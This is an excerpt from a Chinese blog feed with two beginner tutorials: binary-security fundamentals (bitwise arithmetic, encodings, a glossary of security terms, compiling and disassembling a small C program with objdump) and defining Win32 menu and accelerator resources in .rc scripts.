        <content type="html"><![CDATA[<h1 id="1-进制"><a href="#1-进制" class="headerlink" title="1.进制"></a>1.进制</h1><p>进制之间的转化，emmm 这里就不累赘了。</p><p>现在这么先进了，能计算机就计算机吧。当然原理肯定还是要懂的。</p><h1 id="2-编程基础之常见字符编码"><a href="#2-编程基础之常见字符编码" class="headerlink" title="2.编程基础之常见字符编码"></a>2.编程基础之常见字符编码</h1><h2 id="数据宽度"><a href="#数据宽度" class="headerlink" title="数据宽度"></a><strong>数据宽度</strong></h2><p>超出最多宽度的数据会被丢弃</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bit 1</span><br><span class="line">byte80xFF</span><br><span class="line">word160xFFFF</span><br><span class="line">doubleword320xFFFFFFFF</span><br><span class="line">Qword64</span><br></pre></td></tr></table></figure><h2 id="⽆符号数、有符号数"><a href="#⽆符号数、有符号数" class="headerlink" title="⽆符号数、有符号数"></a><strong>⽆符号数、有符号数</strong></h2><p>不说了</p><h2 id="原码、反码、补码"><a href="#原码、反码、补码" class="headerlink" title="原码、反码、补码"></a><strong>原码、反码、补码</strong></h2><p>在计算机中，存储形式是通过补码来存储的</p><p><strong>原码</strong>：最⾼位为符号位，其余各位为数值本身的绝对值</p><p><strong>反码</strong>：<strong>正数</strong>反码与原码相同，<strong>负数</strong>符号位为1，其余位对原码取反</p><p><strong>补码</strong>：<strong>正数</strong>补码与原码相同，<strong>负数</strong>符号位为1，其余位对原码取反加1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1 </span><br><span class="line">1000 0001 </span><br><span class="line">原码：1000 0001</span><br><span class="line">反码 1111 1110</span><br><span class="line">补码 1111 1111</span><br></pre></td></tr></table></figure><h2 id="与运算"><a href="#与运算" class="headerlink" title="与运算"></a><strong>与运算</strong></h2><p>and     &amp;</p><p>两个位都是1才是1。【一假即假】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1011 0001</span><br><span class="line">1101 1000</span><br><span class="line">——————</span><br><span class="line">1001 0000</span><br></pre></td></tr></table></figure><h2 id="或运算"><a href="#或运算" class="headerlink" title="或运算"></a><strong>或运算</strong></h2><p>｜｜</p><p>只要有一个为1就为1。【一真即真】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1011 0001</span><br><span class="line">1101 1000</span><br><span class="line">——————</span><br><span class="line">1111 1001</span><br></pre></td></tr></table></figure><h2 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a><strong>异或运算</strong></h2><p>xor     ^</p><p>不⼀样时则为1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1011 0001</span><br><span class="line">1101 1000</span><br><span class="line">——————</span><br><span class="line">0110 1001</span><br></pre></td></tr></table></figure><h2 id="⾮运算"><a href="#⾮运算" class="headerlink" title="⾮运算"></a><strong>⾮运算</strong></h2><p>Not     ~</p><p>0就是1、1就是0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1101 1000</span><br><span class="line">0010 0111</span><br></pre></td></tr></table></figure><h2 id="左移"><a href="#左移" class="headerlink" title="左移"></a><strong>左移</strong></h2><p>&lt;&lt;     shl </p><p>各⼆进制位全部左移若⼲位，⾼位丢弃，低位补0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1101 1000 </span><br><span class="line">shl2;左移2位</span><br><span class="line">0110 0000</span><br></pre></td></tr></table></figure><h2 id="右移"><a href="#右移" class="headerlink" title="右移"></a><strong>右移</strong></h2><p>Shr     &gt;&gt;</p><p>各⼆进制位全部右移若⼲位，低位丢弃，⾼位补0（shr）或补符号位（sar）</p><h2 id="位运算加减乘除"><a href="#位运算加减乘除" class="headerlink" title="位运算加减乘除"></a><strong>位运算加减乘除</strong></h2><p><strong>4+5的运算过程</strong></p><p>1.转为⼆进制：0000 0100 、0000 0101</p><p>2.两者进⾏异或得出：0000 0001</p><p>3.判断是否存在进位（两者进⾏<strong>与</strong>运算）：0000 0100 .这⾥与运算结果不为0（⼆进制：00000000）则表示存在进位</p><p>4.0000 0001 xor 0000 1000 = 0000 1001</p><p>5.步骤四的结果还需要判断是否存在进位（与运算）：步骤⼆的结果与左移⼀位的步骤三结果 → <strong>0000 0001 and 0000 1000</strong>，得出：0000 0000，则表示不存在进位，步骤四的结果</p><p>则为4+5的最后结果</p><p>6.⼆进制：0000 1001转为⼗进制：9</p><h2 id="什么是编码与解码"><a href="#什么是编码与解码" class="headerlink" title="什么是编码与解码"></a>什么是编码与解码</h2><p><strong>常⻅编码表 ASCII</strong></p><p>网上搜搜就好啦，这里就不赘述了</p><p>在中国是GB2312、GBK、GB18030，UTF-8</p><h1 id="3-二进制安全之反汇编理论"><a href="#3-二进制安全之反汇编理论" class="headerlink" title="3.二进制安全之反汇编理论"></a>3.二进制安全之反汇编理论</h1><h2 id="反汇编器"><a href="#反汇编器" class="headerlink" title="反汇编器"></a><strong>反汇编器</strong></h2><p>反汇编是将⼆进制代码转换成汇编代码</p><p>⾃⼰写⼀个反汇编引擎：【这里了解一下就好啦】</p><p>1.CPU x86 ，⾸先根据不同的CPU,找到CPU⼚商关于CPU指令相关的标准,根据⼆进制与汇编指令的对应关系,写出来⼆进制到汇编代码的转换模块.</p><p>2.根据不同的可执⾏⽂件,找到对应的格式标准,去解析可执⾏⽂件的结构,知道哪⼀块⼆进制是代码,哪⼀块是数据等.</p><h2 id="高级持久威胁-APT"><a href="#高级持久威胁-APT" class="headerlink" title="高级持久威胁(APT)"></a><strong>高级持久威胁</strong>(APT)</h2><p>⼀种网络攻击，这些攻击往往来自多个入口点，并且能使用多个攻击媒介【网络，物理，欺骗】</p><h2 id="PoC和Exploit"><a href="#PoC和Exploit" class="headerlink" title="PoC和Exploit"></a>PoC和Exploit</h2><p>PoC(Proof of Conecpt)，概念性证明，是证明漏洞存在而提供的⼀段代码或方法，只要能触发漏洞即可。</p><p>Exploit是指能够实现漏洞利用的代码，程序或者方法。是PoC的子集。</p><h2 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h2><p>就是溢出了，超出了边界，造成的程序崩溃或者执行了攻击者的命令。</p><h2 id="攻击载荷-Payload"><a href="#攻击载荷-Payload" class="headerlink" title="攻击载荷 Payload"></a>攻击载荷 Payload</h2><p>是系统被攻陷后执行的多阶段恶意代码。</p><p>攻击载荷是在漏洞攻击模块之上的【这里可以想一想MSF咋用的】这个payload就是用来造成破坏的。</p><h2 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h2><p>UPX ， vmp</p><p> 利用特殊的算法，将EXE可执行程序或者DLL动态连接文件的编码进行改变【实现压缩，加密】，实现缩小文件体积或者加密程序编码，或者躲过杀毒软件的查杀【加壳不单单用来躲过杀毒软件的哦】</p><h2 id="软件脱壳"><a href="#软件脱壳" class="headerlink" title="软件脱壳"></a>软件脱壳</h2><p>利用工具，脱去壳。</p><h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><p>加壳，加密，修改特征码，花指令…逃过杀毒软件的查杀。</p><h2 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h2><p>就是垃圾指令【写一堆注释】恶心杀毒软件</p><h2 id="C2"><a href="#C2" class="headerlink" title="C2"></a>C2</h2><p>Command and Control</p><p>常见于APT【红队】攻击场景中，就是恶意软件和攻击者进行交互，也是攻击者的“基础设施”【Metasploit    Cobalt Strike…】</p><h2 id="打补丁（Patching）"><a href="#打补丁（Patching）" class="headerlink" title="打补丁（Patching）"></a>打补丁（Patching）</h2><p>提高安全性增强性能</p><h2 id="Rootkit"><a href="#Rootkit" class="headerlink" title="Rootkit"></a>Rootkit</h2><p>攻击者，隐藏自己的行踪和保留权限的工具。达到长时间控制对方的目的，和后面木马差不多</p><h2 id="模糊测试（fuzz-testing-fuzzing）"><a href="#模糊测试（fuzz-testing-fuzzing）" class="headerlink" title="模糊测试（fuzz testing, fuzzing）"></a>模糊测试（fuzz testing, fuzzing）</h2><p>就是软件测试技术。核心就是将自动或者半自动的生成的随机数输入到一个程序中。并监视程序异常，用来发现程序错误</p><h2 id="是汇编语言？"><a href="#是汇编语言？" class="headerlink" title="是汇编语言？"></a>是汇编语言？</h2><p>Arm，X86，mips….</p><p>之前写的8086和win32。</p><p>BUUCTF</p><h1 id="3-如何反汇编？"><a href="#3-如何反汇编？" class="headerlink" title="3.如何反汇编？"></a>3.如何反汇编？</h1><h2 id="反汇编工具"><a href="#反汇编工具" class="headerlink" title="反汇编工具"></a>反汇编工具</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">OD</span><br><span class="line">IDA Pro</span><br><span class="line">radare2</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="虚拟机的建设"><a href="#虚拟机的建设" class="headerlink" title="虚拟机的建设"></a>虚拟机的建设</h2><p>1.win 7 的 【集成了很多工具的】</p><p>2.ubunt （含有PWN环境）</p><p>【如果需要可以找我】</p><p>【这里需要学一学linux的相关的命令】–以后也会初相对应的内容的</p><p>然后进入ubunt 开始编译一个c文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">下面的命令可以用tab补全，别傻乎乎的全部记</span><br><span class="line"></span><br><span class="line">cd Desktop/ 进入桌面</span><br><span class="line">ls查看一下</span><br><span class="line">mkdir class创建一个目录</span><br><span class="line">cd class进入class</span><br><span class="line">vim add.c用vim这个编辑器创建一个add.c的文件</span><br><span class="line">回车</span><br><span class="line">进入一个页面后 按下 a  进入插入模式</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写入如下的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">static int add_a_and_b(int a, int b)</span><br><span class="line">&#123;</span><br><span class="line"> return a + b;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, const char *argv[])</span><br><span class="line">&#123;</span><br><span class="line"> int a = 1;</span><br><span class="line"> int b = 2;</span><br><span class="line"> int c;</span><br><span class="line"> </span><br><span class="line"> c = add_a_and_b(a, b);</span><br><span class="line"> printf(&quot; %d + %d = %d\n&quot;, a, b, c);</span><br><span class="line"> </span><br><span class="line"> return c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存退出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">按下 esc</span><br><span class="line">按下shitf + :</span><br><span class="line">输入wq 保存并退出</span><br></pre></td></tr></table></figure><p>出来后可以查看一下这个add.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat add.c</span><br></pre></td></tr></table></figure><p>现在是写了一个c文件但是没有编译</p><p>对之进行编译，并且保存在add这个文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o add add.c</span><br></pre></td></tr></table></figure><p>然后可以ls一下，现在发现多了一个add【绿色的】和一个add.c</p><p>查看一下add 这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file add</span><br></pre></td></tr></table></figure><p>通过file命令，就知道这个add可执行文件是一个elf文件。</p><p>查看权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br></pre></td></tr></table></figure><p>运行一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./add</span><br></pre></td></tr></table></figure><p>就能看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 + 2 = 3</span><br></pre></td></tr></table></figure><p>按照elf文件【add】为输入，得到汇编代码==&gt;就是反汇编</p><p>来反汇编一下【现在看一下就好了，后面会学】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -l -x -d add &gt; add.dmp</span><br></pre></td></tr></table></figure><p>然后来看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat add.dmp</span><br></pre></td></tr></table></figure><p>emm 卧槽好多….找到这个目录，把他复制出来可以用编译器打开看着舒服点..</p><p>之前大概学过汇编，所以大概也能看懂。首先找到程序的入口点也就是main函数</p><p>到此，这里就结束了，让我们一起去下一章吧！</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WIN32程序设计-使用资源（5）</title>
      <link href="/2023/05/04/win32%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-5-%E4%BD%BF%E7%94%A8%E8%B5%84%E6%BA%90/"/>
      <url>/2023/05/04/win32%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-5-%E4%BD%BF%E7%94%A8%E8%B5%84%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<ul><li>资源文件的“源文件”是 .rc 的脚本文件</li></ul><h1 id="菜单和加速健"><a href="#菜单和加速健" class="headerlink" title="菜单和加速健"></a>菜单和加速健</h1><h2 id="1-菜单和加速键的组成"><a href="#1-菜单和加速键的组成" class="headerlink" title="1.菜单和加速键的组成"></a>1.菜单和加速键的组成</h2><ul><li>加速健就是快捷键</li><li>/# sharp</li><li>这里有一个工具 resedit-x64 </li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">闪退：</span><br><span class="line">在文件：ResEdit.xml中查找行&quot;&lt;autoCheckupdate value=&quot;true&quot;/&gt;&quot;，并将其替换为&quot;&lt;autocheckUpdate value=&quot;false&quot; /&gt;&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">设置中文</span><br><span class="line">ctrl+P 在第一个地方把语言 english设置成chinese</span><br></pre></td></tr></table></figure><p>ok用这个工具，创建一个菜单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$F -&gt; </span><br><span class="line">\t -&gt; tab健</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230504163520949.png" alt="image-20230504163520949"></p><h2 id="2-菜单和加速键的定义"><a href="#2-菜单和加速键的定义" class="headerlink" title="2.菜单和加速键的定义"></a>2.菜单和加速键的定义</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">//&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">#include&lt;resource.h&gt;</span><br><span class="line">//&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">#defineICO_MAIN0x1000//图标</span><br><span class="line">//&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">#defineIDM_MAIN0x2000//菜单</span><br><span class="line">#defineIDA_MAIN0x2000//加速键</span><br><span class="line">#defineIDM_OPEN0x4101</span><br><span class="line">#defineIDM_OPTION0x4102</span><br><span class="line">#defineIDM_EXIT0x4103   </span><br><span class="line">#defineIDM_SETFONT0x4201</span><br><span class="line">#defineIDM_SETCOLOR0x4202</span><br><span class="line">#defineIDM_INACT0x4203</span><br><span class="line">#defineIDM_GRAY0x4204</span><br><span class="line">#defineIDM_BIG0x4205</span><br><span class="line">#defineIDM_SMALL0x4206</span><br><span class="line">#defineIDM_LIST0x4207</span><br><span class="line">#defineIDM_DETAIL0x4208</span><br><span class="line">#defineIDM_TOOLBAR0x4209</span><br><span class="line">#defineIDM_TOOLBARTEXT0x4210</span><br><span class="line">#defineIDM_INPUTBAR0x4211</span><br><span class="line">#defineIDM_STATUSBAR0x4212</span><br><span class="line">#defineIDM_HELP0x4301</span><br><span class="line">#defineIDM_ABOUT0x4302</span><br><span class="line">//&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">ICO_MAINICON&quot;Main.ico&quot;</span><br><span class="line">//&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">IDM_MAINmenudiscardable</span><br><span class="line">BEGIN</span><br><span class="line">popup&quot;文件(&amp;F)&quot;</span><br><span class="line">BEGIN</span><br><span class="line">menuitem&quot;打开文件(&amp;O)...&quot;,IDM_OPEN</span><br><span class="line">menuitem&quot;关闭文件(&amp;C)...&quot;,IDM_OPTION</span><br><span class="line">menuitemseparator</span><br><span class="line">menuitem&quot;退出(&amp;X)&quot;,IDM_EXIT</span><br><span class="line">END</span><br><span class="line">popup&quot;查看(&amp;V)&quot;</span><br><span class="line">BEGIN</span><br><span class="line">menuitem&quot;字体(&amp;F)...\tAlt+F&quot;,IDM_SETFONT</span><br><span class="line">menuitem&quot;背景色(&amp;B)...\tCtrl+Alt+B&quot;,IDM_SETCOLOR</span><br><span class="line">menuitemSEPARATOR//这个的意思是:画一个分隔符</span><br><span class="line">menuitem&quot;被禁用的菜单项&quot;,IDM_INACT,INACTIVE</span><br><span class="line">menuitem&quot;被灰化的菜单项&quot;,IDM_GRAY,GRAYED</span><br><span class="line">menuitemSEPARATOR</span><br><span class="line">menuitem&quot;大图标(&amp;G)&quot;,IDM_BIG</span><br><span class="line">menuitem&quot;小图标(&amp;M)&quot;,IDM_SMALL</span><br><span class="line">menuitem&quot;列表(&amp;L)&quot;,IDM_LIST</span><br><span class="line">menuitem&quot;详细资料(&amp;D)&quot;,IDM_DETAIL</span><br><span class="line">menuitemseparator</span><br><span class="line">popup&quot;工具栏(&amp;T)&quot;</span><br><span class="line">BEGIN</span><br><span class="line">   menuitem&quot;标准按钮(&amp;S)&quot;,IDM_TOOLBAR</span><br><span class="line">   menuitem&quot;文字标签(&amp;C)&quot;,IDM_TOOLBARTEXT</span><br><span class="line">   menuitem&quot;命令栏(&amp;I)&quot;,IDM_INPUTBAR</span><br><span class="line">END</span><br><span class="line">menuitem&quot;状态栏(&amp;U)&quot;,IDM_STATUSBAR</span><br><span class="line">END</span><br><span class="line">popup&quot;帮助(&amp;H)&quot;,HELP</span><br><span class="line">BEGIN</span><br><span class="line">menuitem&quot;帮助主题(&amp;H)\tF1&quot;,IDM_HELP</span><br><span class="line">menuitemseparator</span><br><span class="line">menuitem&quot;关于本程序(&amp;A)...&quot;,IDM_ABOUT</span><br><span class="line">END</span><br><span class="line">END</span><br><span class="line">//&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">IDA_MAINaccelerators</span><br><span class="line">BEGIN</span><br><span class="line">VK_F1,IDM_HELP,VIRTKEY//这个是使用头文件里面包含好了的，加速键的定义方式</span><br><span class="line">&quot;B&quot;,IDM_SETCOLOR,VIRTKEY,CONTROL,ALT</span><br><span class="line">&quot;F&quot;,IDM_SETFONT,VIRTKEY,ALT</span><br><span class="line">END</span><br><span class="line">//&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-）菜单的定义"><a href="#1-）菜单的定义" class="headerlink" title="1.）菜单的定义"></a>1.）菜单的定义</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">菜单ID MENU [DISCARDABLE] </span><br><span class="line">BEGIN</span><br><span class="line">菜单项定义</span><br><span class="line">...</span><br><span class="line">END </span><br></pre></td></tr></table></figure><p>在上面的代码就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#defineIDM_MAIN0x2000//菜单</span><br><span class="line"></span><br><span class="line">IDM_MAINmenudiscardable</span><br><span class="line">BEGIN</span><br><span class="line">...</span><br><span class="line">END</span><br></pre></td></tr></table></figure><ul><li><p>API函数在检测参数的时候，发现小于10000H的时候就把他认为是数值型，大于10000H的时候就把他当作字符串指针处理</p></li><li><p>discardable 是菜单的存属性，表示菜单在不使用的时候可以展示从内存中释放来节省空间</p></li><li><p>begin 和 end 可以用 { } 来代替</p></li></ul><p>菜单项的定义有3种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MENUITEM    菜单文字,命令ID [,选项列表] （用法1）</span><br><span class="line">MENUITEM    SEPARATOR                    （用法2）</span><br><span class="line">POPUP  菜单文字 [,选项列表] （用法3）    </span><br><span class="line">BEGIN            </span><br><span class="line">item-definitions</span><br><span class="line">...       </span><br><span class="line">END   </span><br></pre></td></tr></table></figure><p>用法1定义的是普通菜单项</p><p>●选项——用来定义菜单项的各种属性，它可以是下列数值：</p><p>■CHECKED——表示打上选定标志（对钩）。</p><p>■GRAYED——表示菜单项是灰化的。</p><p>■INACTIVE——表示菜单项是禁用的。</p><p>■MENUBREAK或MENUBARBREAK——表示将这个菜单项和以后的菜单项列到新的列中</p><p>用法2定义的是菜单项之间的分隔线。</p><p>用法3定义弹出式菜单</p><p>popup菜单的选项列表可以是以下的值：</p><p>●GRAYED——表示菜单项是灰化的。</p><p>●INACTIVE——表示菜单项是禁用的</p><p>●HELP——表示本项和以后的菜单项是右对齐的</p><h3 id="2-）加速键的定义"><a href="#2-）加速键的定义" class="headerlink" title="2.）加速键的定义"></a>2.）加速键的定义</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">加速键ID ACCELERATORS </span><br><span class="line">BEGIN </span><br><span class="line">键名, 命令ID [,类型] [,选项]     </span><br><span class="line">... </span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>上面的代码就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IDA_MAINaccelerators</span><br><span class="line">BEGIN</span><br><span class="line">VK_F1,IDM_HELP,VIRTKEY//这个是使用头文件里面包含好了的，加速键的定义方式</span><br><span class="line">&quot;B&quot;,IDM_SETCOLOR,VIRTKEY,CONTROL,ALT</span><br><span class="line">&quot;F&quot;,IDM_SETFONT,VIRTKEY,ALT</span><br><span class="line">END</span><br></pre></td></tr></table></figure><ul><li>加速键ID同样可以是一个字符串或者是1～65 